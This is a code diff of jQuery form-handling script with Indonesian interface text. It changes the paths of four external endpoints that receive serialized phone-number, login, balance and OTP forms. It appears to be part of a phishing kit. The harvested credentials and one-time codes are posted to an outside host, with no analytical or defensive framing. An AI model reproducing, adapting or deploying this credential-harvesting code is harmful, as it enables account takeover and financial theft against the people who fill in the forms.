@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'https://darksalmon-fish-162265.hostingersite.com/gol/no.php',
+            url: 'https://darksalmon-fish-162265.hostingersite.com/tes/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://darksalmon-fish-162265.hostingersite.com/gol/login.php',
+            url: 'https://darksalmon-fish-162265.hostingersite.com/tes/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'https://darksalmon-fish-162265.hostingersite.com/gol/saldo.php',
+            url: 'https://darksalmon-fish-162265.hostingersite.com/tes/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://darksalmon-fish-162265.hostingersite.com/gol/gas.php',
+ url: 'https://darksalmon-fish-162265.hostingersite.com/tes/gas.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
